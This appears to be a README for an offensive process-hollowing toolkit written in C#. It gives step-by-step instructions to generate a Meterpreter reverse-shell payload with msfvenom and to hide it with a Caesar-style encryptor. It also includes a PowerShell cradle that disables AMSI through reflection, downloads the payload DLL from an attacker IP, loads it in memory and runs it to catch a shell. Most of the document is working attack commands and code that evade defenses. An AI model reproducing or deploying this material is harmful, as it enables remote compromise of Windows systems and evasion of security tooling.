# ProcessHollowing
Process hollowing C# code with shellcode encryptor

Update the rotations count to suit your needs in the CaesarEncryptShell function and PFuncs.cs Decrypt functions
The 2 args for the Encryptor and Main payload are a password and byte array as a iv, just b64 the byte bag and pass as args similar to below

# Encrypt that payload

1: Generate a base64 msf shell
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.111 LPORT=8080 -f base64
  
2: Create some Random Data as an iv
  echo gtukd|base64                                              
AGcABgUAdAAGBgB1AAYDAGsABgUAZA==

3: use the data above to create an encrypted and caesar encoded payload
```
.\ShellCodeEncrypter.exe "SomeRandomPassword123!"

```
4: Copy the byte bag.


# Update Process Hollower

1: Open the processhollower project in visual studio 2019.

2: Update the deployment method ie lib or exe main methods with the C# byte bag received from the encryptor (its obvious just look at entry points)

3: Compile and place the libs in a webserver or other location ready for deployment


# Powershell cradle for Loading the dll

The project includes a ProcessHollowingLib.dll file to load that up during engagement into memory use the following code

```
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};
$d=$c.GetFields('NonPublic,Static');
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};
$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.2.111/ProcessHollowingLib.dll');
$assem = [System.Reflection.Assembly]::Load($data); 
$class = $assem.GetType("ProcessHollowingLib.ProcHollower"); 
$class.GetProperty('Password').SetValue(0,'SomeRandomPassword123!');
$class.GetProperty('IV').SetValue(0,'AGcABgUAdAAGBgB1AAYDAGsABgUAZA==');
$method = $class.GetMethod("DoWork"); 
$method.Invoke(0,$null)
```
Then catch that shell in Msfconsole for the win ;)
